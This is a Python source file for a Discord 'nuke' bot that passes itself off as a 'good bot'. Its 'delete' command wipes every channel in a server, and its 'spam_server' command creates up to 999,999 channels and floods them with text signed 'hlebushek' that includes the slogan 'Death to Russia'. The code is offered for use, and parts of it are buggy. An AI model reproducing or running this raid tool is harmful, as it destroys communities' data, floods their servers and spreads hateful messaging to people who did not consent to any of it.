import discord
from discord.ext import commands
from config import settings
import asyncio

intents = discord.Intents.default()
intents.members = True
bot = commands.Bot(command_prefix = settings['prefix'],  intents = intents)
bot.remove_command('help')


@bot.event
async def on_ready():
    await bot.change_presence(status=discord.Status.online, activity=discord.Game("Хороший бот"))
    print("Готов всех джага-джага")


@bot.command()
async def help(ctx):
    embed = discord.Embed(
    title = "Помощь по спаму",
    description = "`spam!spam_server - Спам сервера`",
    color = ''
    )
    ctx.send(embed=embed)
                    

@bot.command()
async def delete(ctx, n):
    if n != "0":
        channel = n

        await channel.delete()
    else:
        for c in ctx.guild.channels:
            await c.delete()


@bot.command()
async def spam_server(ctx, n):
    spam_text = """
Вы были заспамлены by hlebushek! Слава Украине! Смерть России
Вы были заспамлены by hlebushek! Слава Украине! Смерть России
Вы были заспамлены by hlebushek! Слава Украине! Смерть России
Вы были заспамлены by hlebushek! Слава Украине! Смерть России
Вы были заспамлены by hlebushek! Слава Украине! Смерть России
Вы были заспамлены by hlebushek! Слава Украине! Смерть России
Вы были заспамлены by hlebushek! Слава Украине! Смерть России
Вы были заспамлены by hlebushek! Слава Украине! Смерть России
Вы были заспамлены by hlebushek! Слава Украине! Смерть России
Вы были заспамлены by hlebushek! Слава Украине! Смерть России"""
    
    if n == '0':
        for line in range(0 , 999999):
            guild = ctx.message.guild
            await guild.create_text_channel('сервер-заспамлен-by-hlebushek')
            await ctx.channel.send(spam_text)
    else:        
        for line in range(0 , int(n)):
            guild = ctx.message.guild
            await guild.create_text_channel('сервер-заспамлен-by-hlebushek')
            await ctx.channel.send(spam_text)


@bot.command()
async def stop(ctx):
    await bot.change_presence(status=discord.Status.offline)
    raise SystemExit
bot.run(settings['token'])